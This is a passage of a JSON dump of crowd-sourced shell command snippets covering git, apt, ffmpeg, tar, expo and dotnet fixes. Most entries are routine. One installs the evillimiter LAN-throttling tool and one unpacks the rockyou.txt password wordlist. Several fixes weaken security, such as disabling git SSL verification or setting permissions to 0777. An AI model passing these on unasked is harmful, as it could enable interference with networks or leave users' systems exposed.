    "id": 1381,
    "keyword": null,
    "link": null,
    "title": " ef remove migration",
    "description": "/*to remove the last migration:*/ /*Visual Studio:*/ Remove-Migration /*.Net Core CLI:*/ dotnet ef migrations remove\n* CLI dotnet ef migrations remove  *Package Manager Console PM> Remove-Migration\ndotnet ef database drop -f -v dotnet ef migrations add Initial dotnet ef database update\ndotnet ef database update \n",
    "reg_date": "2021-10-11T22:04:10.000Z"
  },
  {
    "id": 1382,
    "keyword": null,
    "link": null,
    "title": " elastic beanstalk installation command on cli",
    "description": "pip3 install awsebcli \n",
    "reg_date": "2021-10-11T22:04:10.000Z"
  },
  {
    "id": 1383,
    "keyword": null,
    "link": null,
    "title": " electron build windows exe",
    "description": "# for use in npm scripts npm install electron-packager --save-dev  # for use from cli npm install electron-packager -g  electron-packager <sourcedir> <appname> --platform=win32 --arch=x64\n",
    "reg_date": "2021-10-11T22:04:10.000Z"
  },
  {
    "id": 1384,
    "keyword": null,
    "link": null,
    "title": " elementary-tweaks",
    "description": "sudo add-apt-repository ppa:philip.scott/elementary-tweaks sudo apt install elementary-tweaks\n",
    "reg_date": "2021-10-11T22:04:10.000Z"
  },
  {
    "id": 1385,
    "keyword": null,
    "link": null,
    "title": " elevated privileges windows 10",
    "description": "when a user is granted the ability to do more than a standard user\n",
    "reg_date": "2021-10-11T22:04:10.000Z"
  },
  {
    "id": 1386,
    "keyword": null,
    "link": null,
    "title": " else if statement bash syntax",
    "description": "#!/bin/bash   read -p \"Enter your marks: \" marks   if [ $marks -ge 80 ] then     echo \"Very Good\"   elif [ $marks -ge 50 ] then     echo \"Good\"   elif [ $marks -ge 33 ] then     echo \"Just Satisfactory\" else     echo \"Not OK\" fi \n",
    "reg_date": "2021-10-11T22:04:11.000Z"
  },
  {
    "id": 1387,
    "keyword": null,
    "link": null,
    "title": " embed photos google drive",
    "description": "## Change the id for share link  https://drive.google.com/uc?export=view&id=XXXXXXXXXX  ## example https://drive.google.com/file/d/19pV3BC7o7yLK8dPgS4iqrN8G/view?usp=sharing \t\t\t\t\t\t\t\t\t\t  |||||||||||||||||||||||||| ## result https://drive.google.com/uc?export=view&id=19pV3BC7o7yLK8dPgS4iqrN8G\n",
    "reg_date": "2021-10-11T22:04:11.000Z"
  },
  {
    "id": 1388,
    "keyword": null,
    "link": null,
    "title": " empty-commoit",
    "description": "git commit --allow-empty -m \"run build\"\n",
    "reg_date": "2021-10-11T22:04:11.000Z"
  },
  {
    "id": 1389,
    "keyword": null,
    "link": null,
    "title": " enable epel repo centos 7",
    "description": "cd /tmp wget https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm ls *.rpm\n",
    "reg_date": "2021-10-11T22:04:11.000Z"
  },
  {
    "id": 1390,
    "keyword": null,
    "link": null,
    "title": " enable ufw ubuntu",
    "description": "sudo ufw enable\nsudo ufw allow http sudo ufw allow 80  \nsudo ufw allow from 15.15.15.0/24  to any port 22 \n",
    "reg_date": "2021-10-11T22:04:11.000Z"
  },
  {
    "id": 1391,
    "keyword": null,
    "link": null,
    "title": " enter docker container shell",
    "description": "docker exec -it <mycontainer> bash docker exec -it <mycontainer> sh ##for alpine\ndocker exec -it <mycontainer> bash //or  docker exec -it <mycontainer> sh\ndocker exec -it nginx /bin/bash\n",
    "reg_date": "2021-10-11T22:04:11.000Z"
  },
  {
    "id": 1392,
    "keyword": null,
    "link": null,
    "title": " environment variables with github actions react app",
    "description": "name: Deploy to GitHub Pages     on:       push:         branches:           - master     jobs:       build-and-deploy:         runs-on: ubuntu-latest         steps:         - name: Checkout           uses: actions/checkout@v1          - name: Build           run: |             npm install             npm run-script build           env:             REACT_APP_INSTAGRAM_ACCESS_TOKEN: ${{ secrets.REACT_APP_INSTAGRAM_ACCESS_TOKEN }}             REACT_APP_SMTP_SECURE_TOKEN: ${{ secrets.REACT_APP_SMTP_SECURE_TOKEN }}          - name: Deploy           uses: JamesIves/github-pages-deploy-action@releases/v3           with:             GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN_KEY }}             BRANCH: gh-pages             FOLDER: dist\n",
    "reg_date": "2021-10-11T22:04:12.000Z"
  },
  {
    "id": 1393,
    "keyword": null,
    "link": null,
    "title": " environment variables with react and github pages",
    "description": "name: Deploy to GitHub Pages     on:       push:         branches:           - master     jobs:       build-and-deploy:         runs-on: ubuntu-latest         steps:         - name: Checkout           uses: actions/checkout@v1          - name: Build           run: |             npm install             npm run-script build           env:             REACT_APP_INSTAGRAM_ACCESS_TOKEN: ${{ secrets.REACT_APP_INSTAGRAM_ACCESS_TOKEN }}             REACT_APP_SMTP_SECURE_TOKEN: ${{ secrets.REACT_APP_SMTP_SECURE_TOKEN }}          - name: Deploy           uses: JamesIves/github-pages-deploy-action@releases/v3           with:             GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN_KEY }}             BRANCH: gh-pages             FOLDER: dist \n",
    "reg_date": "2021-10-11T22:04:12.000Z"
  },
  {
    "id": 1394,
    "keyword": null,
    "link": null,
    "title": " epub linux reader",
    "description": "sudo apt-add-repository ppa:bookworm-team/bookworm sudo apt update sudo apt install com.github.babluboy.bookworm\n",
    "reg_date": "2021-10-11T22:04:12.000Z"
  },
  {
    "id": 1395,
    "keyword": null,
    "link": null,
    "title": " epub reader on ubuntu",
    "description": "sudo apt-get install fbreader\nsudo apt-add-repository ppa:bookworm-team/bookworm sudo apt update sudo apt install com.github.babluboy.bookworm\n",
    "reg_date": "2021-10-11T22:04:12.000Z"
  },
  {
    "id": 1396,
    "keyword": null,
    "link": null,
    "title": " error: ‘thread’ is not a member of  std",
    "description": "#In Shell use -std flag and give the version you wanna use g++ -std=c++17 hello.cpp\n",
    "reg_date": "2021-10-11T22:04:12.000Z"
  },
  {
    "id": 1397,
    "keyword": null,
    "link": null,
    "title": " error: Fehler beim Versenden einiger Referenzen nach 'git@git",
    "description": "Just pull repository first and then try to push again git pull --rebase remote_repo git push origin remote_repo\n",
    "reg_date": "2021-10-11T22:04:12.000Z"
  },
  {
    "id": 1398,
    "keyword": null,
    "link": null,
    "title": " error: can't find python executable \"python\", you can set the python env variable.",
    "description": "apt-get update      apt-get install python2.7     ln -s /usr/bin/python2.7 /usr/bin/python \n",
    "reg_date": "2021-10-11T22:04:12.000Z"
  },
  {
    "id": 1399,
    "keyword": null,
    "link": null,
    "title": " error: cannot open .git/FETCH HEAD: Permission denied",
    "description": "sudo chown -R $(whoami) .git/ \n",
    "reg_date": "2021-10-11T22:04:13.000Z"
  },
  {
    "id": 1400,
    "keyword": null,
    "link": null,
    "title": " error: command 'x86 64-linux-gnu-gcc' failed with exit status 1",
    "description": "$ sudo apt-get install libxml2-dev libxslt1-dev \nsudo apt-get install libpq-dev libxml2-dev libxslt1-dev python-dev\nsudo apt-get install python-dev sudo apt-get install libxml2-dev libxslt1-dev\nsudo apt-get install gcc python3.x-dev # choose correct python version\n",
    "reg_date": "2021-10-11T22:04:13.000Z"
  },
  {
    "id": 1401,
    "keyword": null,
    "link": null,
    "title": " error: failed to push some refs to",
    "description": "git push -f origin master \ngit pull --rebase origin main git push origin main \ngit pull --rebase git push \ngit config --global pull.rebase true git config --global rebase.autoStash true \ngit commit -m \"initial commit\" git push origin +HEAD \ngit pull origin <your-branch>git push origin <your-branch>\n",
    "reg_date": "2021-10-11T22:04:13.000Z"
  },
  {
    "id": 1402,
    "keyword": null,
    "link": null,
    "title": " error: pcap library not found!",
    "description": " sudo apt install libpcap-dev libsqlite3-dev\n",
    "reg_date": "2021-10-11T22:04:13.000Z"
  },
  {
    "id": 1403,
    "keyword": null,
    "link": null,
    "title": " error: postcss plugin tailwindcss requires postcss 8.",
    "description": "npm uninstall tailwindcss postcss autoprefixer npm install -D tailwindcss@npm:@tailwindcss/postcss7-compat postcss@^7 autoprefixer@^9\nyarn remove tailwindcss postcss autoprefixer yarn add tailwindcss@npm:@tailwindcss/postcss7-compat @tailwindcss/postcss7-compat postcss@^7 autoprefixer@^9  # For zsh: yarn add \"tailwindcss@npm:@tailwindcss/postcss7-compat\" \"@tailwindcss/postcss7-compat\" \"postcss@^7 autoprefixer@^9\"\n",
    "reg_date": "2021-10-11T22:04:13.000Z"
  },
  {
    "id": 1404,
    "keyword": null,
    "link": null,
    "title": " error: snap \"flutter\" has \"remove-snap\" change in progress",
    "description": "snap changes   sudo snap abort [number ID] \n",
    "reg_date": "2021-10-11T22:04:13.000Z"
  },
  {
    "id": 1405,
    "keyword": null,
    "link": null,
    "title": " error: src refspec main does not match any error: failed to push some refs to \"https://www.github.com/username/repo-name.git\"",
    "description": "git push origin HEAD:master \n",
    "reg_date": "2021-10-11T22:04:14.000Z"
  },
  {
    "id": 1406,
    "keyword": null,
    "link": null,
    "title": " error: src refspec master does not match any. git",
    "description": "# You are trying to add an empty repository, add something first, like a readme touch README.md git add README.md git commit -m \"Initial commit\" git push --set-upstream origin master\n#THis is not my solution but one this have worked for me in different situation so i copied all of them git init git add . //to add everything git commit -m '' git remote -v git push heroku master  //New git config --global user.email \"you@example.com\"  git config --global user.name \"Your Name\" # You are trying to add an empty repository, add something first, like a readme touch README.md git add README.md git commit -m \"Initial commit\" git push --set-upstream origin master\ngit init git add . //to add everything git commit -m '' git remote -v git push heroku master \n",
    "reg_date": "2021-10-11T22:04:14.000Z"
  },
  {
    "id": 1407,
    "keyword": null,
    "link": null,
    "title": " error: you need to resolve your current index first git",
    "description": "git reset --merge\ngit reset --merge \n",
    "reg_date": "2021-10-11T22:04:14.000Z"
  },
  {
    "id": 1408,
    "keyword": null,
    "link": null,
    "title": " error cannot find module 'browser-sync' gulp",
    "description": "npm cache clean  npm i browser-sync --save\n",
    "reg_date": "2021-10-11T22:04:14.000Z"
  },
  {
    "id": 1409,
    "keyword": null,
    "link": null,
    "title": " error failed to launch the browser process puppeteer",
    "description": "// Puppeteer Error on ubuntu 100% Correct Solution by Vivek wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb sudo apt install ./google-chrome-stable_current_amd64.deb \n",
    "reg_date": "2021-10-11T22:04:14.000Z"
  },
  {
    "id": 1410,
    "keyword": null,
    "link": null,
    "title": " error gyp ERR! stack Error: not found: make",
    "description": "$ sudo apt-get install build-essential \n",
    "reg_date": "2021-10-11T22:04:14.000Z"
  },
  {
    "id": 1411,
    "keyword": null,
    "link": null,
    "title": " error installing drivelist  npm",
    "description": "> npm install electron-rebuild\n> npm install electron@^3.0.10\n> ./node_modules/.bin/electron-rebuild\n",
    "reg_date": "2021-10-11T22:04:14.000Z"
  },
  {
    "id": 1412,
    "keyword": null,
    "link": null,
    "title": " error loading mysqldb module.",
    "description": "sudo apt-get install libmysqlclient-dev sudo apt-get install libssl-dev pip install mysqlclient  #for Debian su apt install libmysqlclient-dev su apt install libssl-dev pip install mysqlclient\npip3 install http://cdn.mysql.com/Downloads/Connector-Python/mysql-connector-python-2.0.4.zip\n",
    "reg_date": "2021-10-11T22:04:15.000Z"
  },
  {
    "id": 1413,
    "keyword": null,
    "link": null,
    "title": " error mounting dev sdb1 at media on ubuntu",
    "description": "sudo ntfsfix /dev/sdb1  \n",
    "reg_date": "2021-10-11T22:04:15.000Z"
  },
  {
    "id": 1414,
    "keyword": null,
    "link": null,
    "title": " error permission to .git denied to deploy key",
    "description": "ssh-agent bash -c 'ssh-add ~/.ssh/id_rsa; your_git command'\n",
    "reg_date": "2021-10-11T22:04:15.000Z"
  },
  {
    "id": 1415,
    "keyword": null,
    "link": null,
    "title": " error ppa.launchpad.net/certbot/certbot/ubuntu focal Release",
    "description": "sudo apt-add-repository -r ppa:certbot/certbot \n",
    "reg_date": "2021-10-11T22:04:15.000Z"
  },
  {
    "id": 1416,
    "keyword": null,
    "link": null,
    "title": " error while installing psycopg2 on ubuntu 20.04",
    "description": "$ sudo apt-get install libpq-dev python-dev \n",
    "reg_date": "2021-10-11T22:04:15.000Z"
  },
  {
    "id": 1417,
    "keyword": null,
    "link": null,
    "title": " error while installing pyaudio",
    "description": "pip install pipwin pipwin install pyaudio \npip install pipwin pipwin install pyaudio\n",
    "reg_date": "2021-10-11T22:04:15.000Z"
  },
  {
    "id": 1418,
    "keyword": null,
    "link": null,
    "title": " error while loading shared libraries: libaio.so.1: cannot open shared object file: No such file or directory\"",
    "description": "sudo apt-get install libaio1 libaio-dev\n",
    "reg_date": "2021-10-11T22:04:16.000Z"
  },
  {
    "id": 1419,
    "keyword": null,
    "link": null,
    "title": " error while loading shared libraries: libasound.so.2: cannot open shared object file: No such file or directory",
    "description": "sudo apt-get update sudo apt-get install libglib2.0-0\nsudo apt-get install libasound2 \ncd /etc/apt/ sudo gedit sources.list  #add following lines to end of the file and save it  #Bionic support  deb http://ca.archive.ubuntu.com/ubuntu/ bionic main restricted deb http://ca.archive.ubuntu.com/ubuntu/ bionic universe deb http://ca.archive.ubuntu.com/ubuntu/ bionic multiverse  run: sudo apt update sudo apt install libssl1.0.0\n",
    "reg_date": "2021-10-11T22:04:16.000Z"
  },
  {
    "id": 1420,
    "keyword": null,
    "link": null,
    "title": " eslint fix",
    "description": "npm run lint -- --fix \n# cd to your root project folder eslint \"./**\" --fix\ntslint --fix -c ./config/tslint.json 'src/**/*{.ts,.tsx}'\nyarn lint-fix\n",
    "reg_date": "2021-10-11T22:04:16.000Z"
  },
  {
    "id": 1421,
    "keyword": null,
    "link": null,
    "title": " eslint npm install",
    "description": "$ npm install eslint --save-dev $ ./node_modules/.bin/eslint --init\n#install globally npm i -g eslint  #install in project npm install eslint --save-dev\nnpm install eslint-plugin-react-hooks --save-dev\n",
    "reg_date": "2021-10-11T22:04:16.000Z"
  },
  {
    "id": 1422,
    "keyword": null,
    "link": null,
    "title": " eslint prettier reactjs",
    "description": "$ yarn add eslint prettier eslint-config-prettier eslint-plugin-prettier eslint-plugin-react eslint-plugin-react-hooks  # .eslintrc {   \"parser\": \"babel-eslint\",   \"extends\": [\"airbnb-base\", \"prettier\"],   \"plugins\": [\"import\"],   \"env\": {     \"browser\": true,     \"es6\": true   },   \"globals\": {},   \"rules\": {     \"import/no-cycle\": \"warn\",   },   \"parserOptions\": {     \"sourceType\": \"module\"   } }   # .prettierc {   \"printWidth\": 100,   \"tabWidth\": 2,   \"useTabs\": false,   \"semi\": true,   \"singleQuote\": true,   \"arrowParens\": \"avoid\",   \"trailingComma\": \"all\" } \n",
    "reg_date": "2021-10-11T22:04:16.000Z"
  },
  {
    "id": 1423,
    "keyword": null,
    "link": null,
    "title": " evillimiter: command not found",
    "description": "sudo apt-get install git sudo apt-get install python3-setuptools git clone https://github.com/bitbrute/evillimiter.git cd evillimiter sudo python3 setup.py install cd bin sudo evillimiter\n",
    "reg_date": "2021-10-11T22:04:16.000Z"
  },
  {
    "id": 1424,
    "keyword": null,
    "link": null,
    "title": " example of hexdump",
    "description": "$ hexdump --canonical foo.png  00000000  89 50 4e 47 0d 0a 1a 0a  00 00 00 0d 49 48 44 52  |.PNG........IHDR| 00000010  00 00 00 01 00 00 00 01  01 00 00 00 00 37 6e f9  |.............7n.| 00000020  24 00 00 00 04 67 41 4d  41 00 00 b1 8f 0b fc 61  |$....gAMA......a| 00000030  05 00 00 00 20 63 48 52  4d 00 00 7a 26 00 00 80  |.... cHRM..z&...| 00000040  84 00 00 fa 00 00 00 80  e8 00 00 75 30 00 00 ea  |...........u0...| 00000050  60 00 00 3a 98 00 00 17  70 9c ba 51 3c 00 00 00  |`..:....p..Q<...| 00000060  02 62 4b 47 44 00 01 dd  8a 13 a4 00 00 00 07 74  |.bKGD..........t| 00000070  49 4d 45 07 e3 07 1a 08  39 35 87 a4 b0 46 00 00  |IME.....95...F..| 00000080  00 0a 49 44 41 54 08 d7  63 60 00 00 00 02 00 01  |..IDAT..c`......| 00000090  e2 21 bc 33 00 00 00 25  74 45 58 74 64 61 74 65  |.!.3...%tEXtdate| 000000a0  3a 63 72 65 61 74 65 00  32 30 31 39 2d 30 37 2d  |:create.2019-07-| 000000b0  32 35 54 32 30 3a 35 37  3a 35 33 2b 31 32 3a 30  |25T20:57:53+12:0| 000000c0  30 ac cd 5d c1 00 00 00  25 74 45 58 74 64 61 74  |0..]....%tEXtdat| 000000d0  65 3a 6d 6f 64 69 66 79  00 32 30 31 39 2d 30 37  |e:modify.2019-07| 000000e0  2d 32 35 54 32 30 3a 35  37 3a 35 33 2b 31 32 3a  |-25T20:57:53+12:| 000000f0  30 30 dd 90 e5 7d 00 00  00 00 49 45 4e 44 ae 42  |00...}....IEND.B| 00000100  60 82                                             |`.| 00000102\n",
    "reg_date": "2021-10-11T22:04:16.000Z"
  },
  {
    "id": 1425,
    "keyword": null,
    "link": null,
    "title": " exclude/prevent file from commit using git ignore",
    "description": "#To prevent a file from being committed to a repo: #1. Create a text file in the directory where your project files are located. #2. Name the file '.gitignore'. Note, there is a period(.) before the name. #3. Enter the names of the files you want git to ignore in the .gitignore txt file. #4. Voila, git will always not commit any file you listed in .gitignore #but will still be available in your working directory\n",
    "reg_date": "2021-10-11T22:04:16.000Z"
  },
  {
    "id": 1426,
    "keyword": null,
    "link": null,
    "title": " excluir repositorio git local",
    "description": "$ rm -rf .git \n",
    "reg_date": "2021-10-11T22:04:17.000Z"
  },
  {
    "id": 1427,
    "keyword": null,
    "link": null,
    "title": " exit git log",
    "description": "Type q to exit git log\nExit git log: q\n",
    "reg_date": "2021-10-11T22:04:17.000Z"
  },
  {
    "id": 1428,
    "keyword": null,
    "link": null,
    "title": " exit vim",
    "description": "#Press 'Esc' to change from Edit Mode to Command Mode #Exit :q #Force quit without saving :q! #Save file and quit :wq\nPress Esc key: This is very important, because you must exit the edit mode first before typing the exit command(s). Next, you can type one of the following commands: :q (yes, the colon is included in the command) &ndash; This will quit the editor :q! &ndash; Quit Vim without saving the data file :wq &ndash; Save the file and exit Vim And then press the Enter key\n#how to get out from vim Editor (linux)  #Press 'Esc' to change from Edit Mode to Command Mode #Exit :q #Force quit without saving :q! #Save file and quit :wq\n# ESC to start command prompt, then :q!\t\t# exit vi without saving :wq!\t# exit vi with saving (! means exiting even if file is read only)\nwq &ndash; Save the file and exit Vim\n",
    "reg_date": "2021-10-11T22:04:17.000Z"
  },
  {
    "id": 1429,
    "keyword": null,
    "link": null,
    "title": " expo build android",
    "description": "expo build:android or expo build:ios\nexpo build:android\nexpo build:android -t app-bundle\ncd android gradlew clean  cd .. react-native run-android \nexpo build:android --release-channel <your-channel>\n",
    "reg_date": "2021-10-11T22:04:17.000Z"
  },
  {
    "id": 1430,
    "keyword": null,
    "link": null,
    "title": " expo cli",
    "description": "npm install -g expo-cli \nnpm install -g expo-cli\nsudo npm install -g expo-cli\n",
    "reg_date": "2021-10-11T22:04:17.000Z"
  },
  {
    "id": 1431,
    "keyword": null,
    "link": null,
    "title": " expo install globally",
    "description": "npm install --global expo-cli\n",
    "reg_date": "2021-10-11T22:04:17.000Z"
  },
  {
    "id": 1432,
    "keyword": null,
    "link": null,
    "title": " expo install in ubuntu",
    "description": "npm install --global expo-cli\n",
    "reg_date": "2021-10-11T22:04:18.000Z"
  },
  {
    "id": 1433,
    "keyword": null,
    "link": null,
    "title": " expo typescript",
    "description": "expo init -t expo-template-blank-typescript \nexpo init my-app -t expo-template-blank-typescript \n",
    "reg_date": "2021-10-11T22:04:18.000Z"
  },
  {
    "id": 1434,
    "keyword": null,
    "link": null,
    "title": " expo upgrade reset",
    "description": "git clean --force && git reset --hard\n",
    "reg_date": "2021-10-11T22:04:18.000Z"
  },
  {
    "id": 1435,
    "keyword": null,
    "link": null,
    "title": " expo upgrade sdk version",
    "description": "expo upgrade\n",
    "reg_date": "2021-10-11T22:04:18.000Z"
  },
  {
    "id": 1436,
    "keyword": null,
    "link": null,
    "title": " export path linux",
    "description": "export PATH=$PATH:/place/with/the/file\n",
    "reg_date": "2021-10-11T22:04:18.000Z"
  },
  {
    "id": 1437,
    "keyword": null,
    "link": null,
    "title": " extract a tar.xz file linux",
    "description": "tar -xf file.tar.xz\ntar -xf filename.tar.xz\ntar -xvf file_name.tar.xz\n",
    "reg_date": "2021-10-11T22:04:19.000Z"
  },
  {
    "id": 1438,
    "keyword": null,
    "link": null,
    "title": " extract a tar.xz in linux",
    "description": "tar -xf archive.tar.xz -C /home/linuxize/files\ntar -xvf archive.tar.xz\n",
    "reg_date": "2021-10-11T22:04:20.000Z"
  },
  {
    "id": 1439,
    "keyword": null,
    "link": null,
    "title": " extract bz2 linux",
    "description": "tar -xf archive.tar.bz2Copy\n",
    "reg_date": "2021-10-11T22:04:20.000Z"
  },
  {
    "id": 1440,
    "keyword": null,
    "link": null,
    "title": " extract extension tbz2 ubuntu",
    "description": "tar -xvjf file_name.tar.bz2\n",
    "reg_date": "2021-10-11T22:04:20.000Z"
  },
  {
    "id": 1441,
    "keyword": null,
    "link": null,
    "title": " extract gz file ubuntu",
    "description": "gunzip -k file.gz \ngzip -d file.gz\n#Untar to the specific dirctory -C qualifier for customized directory #You must cd into the directory containg the file first tar -xf archive.tar.gz -C /home/linuxize/files #Untar specific files from  archive.tar.gz tar -xf archive.tar.gz file1 file2\nUnzip a . GZ file by typing \"gunzip\" into the \"Terminal\" window\n",
    "reg_date": "2021-10-11T22:04:20.000Z"
  },
  {
    "id": 1442,
    "keyword": null,
    "link": null,
    "title": " extract numners from string linux",
    "description": "$ NUMBER=$(echo \"I am 999 years old.\" | grep -o -E '[0-9]+') $ echo $NUMBER 999 \necho 'Insert completed. 100 rows added ' | awk '{print $(NF-2)}'\n",
    "reg_date": "2021-10-11T22:04:21.000Z"
  },
  {
    "id": 1443,
    "keyword": null,
    "link": null,
    "title": " extract rockyou.txt kali linux",
    "description": "Extract rockyou.txt kali linux  Open wordlist tool and use these commands # gunzip rockyou.txt.gz  # cat rockyou.txt\n",
    "reg_date": "2021-10-11T22:04:21.000Z"
  },
  {
    "id": 1444,
    "keyword": null,
    "link": null,
    "title": " extract tar.gz mac command line",
    "description": "tar -xzvf myfile.tar.gz\n",
    "reg_date": "2021-10-11T22:04:21.000Z"
  },
  {
    "id": 1445,
    "keyword": null,
    "link": null,
    "title": " extract tar.gz ubuntu terminal",
    "description": "tar -xvf yourfile.tar.gz\ngzip -d file.gz\ncd ~/Downloads/archive.tar.gz #first navigate to file location tar -xzvf archive.tar.gz -C /path/to/new/directory/  #-C flag will change the extraction to a new directory. #remove -C if you want to extract it to current location.\n",
    "reg_date": "2021-10-11T22:04:21.000Z"
  },
  {
    "id": 1446,
    "keyword": null,
    "link": null,
    "title": " extract tar.xz ubuntu",
    "description": "tar -xf file.tar.xz\n",
    "reg_date": "2021-10-11T22:04:21.000Z"
  },
  {
    "id": 1447,
    "keyword": null,
    "link": null,
    "title": " extract tar gz overwrite",
    "description": "# tar -xvf command will overwrite the files. Suppose if you use &ldquo;-k&rdquo; then it will keep your old files. tar -xvf --overwrite archive.tar.gz\n",
    "reg_date": "2021-10-11T22:04:21.000Z"
  },
  {
    "id": 1448,
    "keyword": null,
    "link": null,
    "title": " extract tar linux",
    "description": "tar -xvf filename.tar\n## Untar files in Current Directory ## tar -xvf filename.tar.gz  ## Untar files in specified Directory ## tar -xvf filename.tar.gz -C /path_name_for_unzip/  -x : extract -C : specified directory -v : Verbosely show the .tar file progress. -f : filename of archive file\ntar -xvf yourfile.tar.gz\ntar -zxvf file_name.tar.gz\ntar -xzvf archive.tar.gz\ntar -xvf file.tar\n",
    "reg_date": "2021-10-11T22:04:21.000Z"
  },
  {
    "id": 1449,
    "keyword": null,
    "link": null,
    "title": " failed to download repository information ubuntu",
    "description": "sudo apt-get clean sudo apt-get update sudo apt-get upgrade \n",
    "reg_date": "2021-10-11T22:04:21.000Z"
  },
  {
    "id": 1450,
    "keyword": null,
    "link": null,
    "title": " failed to load module canberra-gtk-module",
    "description": "sudo apt install libcanberra-gtk-module libcanberra-gtk3-module \n#for matlab type following on terminal export GTK_PATH=/usr/lib/x86_64-linux-gnu/gtk-2.0\n",
    "reg_date": "2021-10-11T22:04:21.000Z"
  },
  {
    "id": 1451,
    "keyword": null,
    "link": null,
    "title": " failed to open stream: Permission denied in path on mac",
    "description": " sudo chmod -R 0777 /path\n",
    "reg_date": "2021-10-11T22:04:22.000Z"
  },
  {
    "id": 1452,
    "keyword": null,
    "link": null,
    "title": " failed to restart mysql.service: unit mysql.service not found.",
    "description": "# Try Uninstalling and Installing again  # Uninstall:  sudo apt-get purge mysql-server sudo apt-get autoremove sudo apt-get autoclean  # Install: sudo apt-get update sudo apt-get install mysql-server\n",
    "reg_date": "2021-10-11T22:04:22.000Z"
  },
  {
    "id": 1453,
    "keyword": null,
    "link": null,
    "title": " failed to start daemon: pid file found, ensure docker is not running or delete /var/run/docker.pid",
    "description": "sudo rm /var/run/docker.pid systemctl start docker\n$  rm -rf /var/snap/docker/179/run/docker.pid $ systemctl start docker\n",
    "reg_date": "2021-10-11T22:04:22.000Z"
  },
  {
    "id": 1454,
    "keyword": null,
    "link": null,
    "title": " fatal: invalid upstream 'master'",
    "description": "git rebase origin/master\n",
    "reg_date": "2021-10-11T22:04:22.000Z"
  },
  {
    "id": 1455,
    "keyword": null,
    "link": null,
    "title": " fatal: refusing to merge unrelated histories",
    "description": "git pull origin master --allow-unrelated-histories\nfatal: refusing to merge unrelated histories solution: git pull --allow-unrelated-histories\ngit pull origin branchname --allow-unrelated-histories \ngit pull origin main --allow-unrelated-histories\ngit pull origin master --allow-unrelated-histories \ngit pull origin master --allow-unrelated-histories then when asked for merging vim editor opens click insert (i) type msg and :wq to save and exit\ngit pull origin master --allow-unrelated-histories git pull <remote> <branch> --allow-unrelated-histories\ngit pull origin <branch> --allow-unrelated-histories\ncopied!git pull --allow-unrelated-histories \nfatal: refusing to merge unrelated histories\n",
    "reg_date": "2021-10-11T22:04:22.000Z"
  },
  {
    "id": 1456,
    "keyword": null,
    "link": null,
    "title": " fatal: the remote end hung up unexpectedly",
    "description": "git remote remove origin git remote add origin  https://gitlab.com/your-page/your-page.git\ngit config --global http.postBuffer 100000000\n//fatal: the remote end hung up unexpectedly //Run this command git config http.postBuffer 524288000 \ngit config http.postBuffer 524288000\n",
    "reg_date": "2021-10-11T22:04:22.000Z"
  },
  {
    "id": 1457,
    "keyword": null,
    "link": null,
    "title": " fatal: unable to access",
    "description": "git config --global --unset-all https.proxy \n",
    "reg_date": "2021-10-11T22:04:23.000Z"
  },
  {
    "id": 1458,
    "keyword": null,
    "link": null,
    "title": " fatal: unable to access 'https://github.com/swarooprk7/tedx sit.git/': Could not resolve host: github.com",
    "description": "git config --global --unset https.proxy \n",
    "reg_date": "2021-10-11T22:04:23.000Z"
  },
  {
    "id": 1459,
    "keyword": null,
    "link": null,
    "title": " fatal: unable to access Could not resolve host wsl",
    "description": "#on WSL: sudo rm /etc/resolv.conf #restart WSL\n",
    "reg_date": "2021-10-11T22:04:23.000Z"
  },
  {
    "id": 1460,
    "keyword": null,
    "link": null,
    "title": " fatal: unable to access git clone",
    "description": "git config --global http.sslVerify false\n",
    "reg_date": "2021-10-11T22:04:23.000Z"
  },
  {
    "id": 1461,
    "keyword": null,
    "link": null,
    "title": " fatal: unable to auto-detect email address (got 'root@LaptopName.(none)')",
    "description": "git config --global user.email \"you@example.com\" git config --global user.name \"Your Name\"\n",
    "reg_date": "2021-10-11T22:04:23.000Z"
  },
  {
    "id": 1462,
    "keyword": null,
    "link": null,
    "title": " fatal error: portaudio.h: No such file or directory",
    "description": "$ apt-get install python-pyaudio python3-pyaudio portaudio19-dev\n",
    "reg_date": "2021-10-11T22:04:23.000Z"
  },
  {
    "id": 1463,
    "keyword": null,
    "link": null,
    "title": " fbreader linux",
    "description": "sudo apt-get install fbreader\n",
    "reg_date": "2021-10-11T22:04:23.000Z"
  },
  {
    "id": 1464,
    "keyword": null,
    "link": null,
    "title": " feathersjs cli",
    "description": "npm install -g @feathersjs/cli\n",
    "reg_date": "2021-10-11T22:04:23.000Z"
  },
  {
    "id": 1465,
    "keyword": null,
    "link": null,
    "title": " fedora install snapd",
    "description": "sudo dnf install snapd \n",
    "reg_date": "2021-10-11T22:04:24.000Z"
  },
  {
    "id": 1466,
    "keyword": null,
    "link": null,
    "title": " fetch a particular branch git",
    "description": "git fetch origin branch-name \ngit fetch <remote_rep> <remote_branch>:<local_branch>\n",
    "reg_date": "2021-10-11T22:04:24.000Z"
  },
  {
    "id": 1467,
    "keyword": null,
    "link": null,
    "title": " ffmpeg add two videos together",
    "description": "$ cat mylist.txt file '/path/to/file1' file '/path/to/file2' file '/path/to/file3'      $ ffmpeg -f concat -safe 0 -i mylist.txt -c copy output.mp4 \n",
    "reg_date": "2021-10-11T22:04:24.000Z"
  },
  {
    "id": 1468,
    "keyword": null,
    "link": null,
    "title": " ffmpeg convert mov to mp4",
    "description": "ffmpeg -i my-video.mov -vcodec h264 -acodec mp2 my-video.mp4\nffmpeg -i \"file.mkv\" -codec copy -strict -2 \"file.mp4\"\n",
    "reg_date": "2021-10-11T22:04:24.000Z"
  },
  {
    "id": 1469,
    "keyword": null,
    "link": null,
    "title": " ffmpeg cutting time video",
    "description": "ffmpeg -i input.mp4 -ss 00:00:30 -t 00:00:30 -async 1 output.mp4  # -ss start poin # -t time record \n",
    "reg_date": "2021-10-11T22:04:24.000Z"
  },
  {
    "id": 1470,
    "keyword": null,
    "link": null,
    "title": " ffmpeg increase volume",
    "description": "ffmpeg -i input.wav -filter:a \"volume=1.5\" output.wav \nffmpeg -i in.mp3 -af \"pan=stereo:c0=0*c0|c1=1*c1\" out.wav \n",
    "reg_date": "2021-10-11T22:04:24.000Z"
  },
  {
    "id": 1471,
    "keyword": null,
    "link": null,
    "title": " ffmpeg shrink video size",
    "description": " ffmpeg -i input.mp4 -vcodec libx265 -crf 28 output.mp4\n",
    "reg_date": "2021-10-11T22:04:24.000Z"
  },
  {
    "id": 1472,
